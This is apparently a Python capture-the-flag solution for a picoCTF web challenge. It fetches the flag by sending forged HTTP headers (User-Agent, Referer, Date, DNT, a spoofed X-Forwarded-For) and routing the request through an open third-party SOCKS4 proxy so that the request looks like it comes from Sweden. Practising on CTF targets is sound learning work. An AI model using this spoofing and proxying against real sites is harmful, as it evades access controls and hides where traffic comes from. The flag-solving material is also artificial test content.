#!/usr/bin/python3
import requests
import re

url = 'http://mercury.picoctf.net:52362/'

headers = {
    'User-Agent': 'PicoBrowser',
    'Accept-Language': 'sv-SE',
    'Referer': url,
    'Date': "Wed, 21 Oct 2018 07:28:00 GMT",
    'DNT': '1',
    'X-Forwarded-For': '85.228.41.27'
}

proxies = {
    "http": "socks4://85.228.41.27:4153"
    # "http": "socks4://213.101.151.4:1080"
}

response = requests.get(url, headers=headers, proxies=proxies)
# response = requests.get(url, headers=headers)


flag = re.findall('picoCTF{.*}', response.text)[0]
print(flag)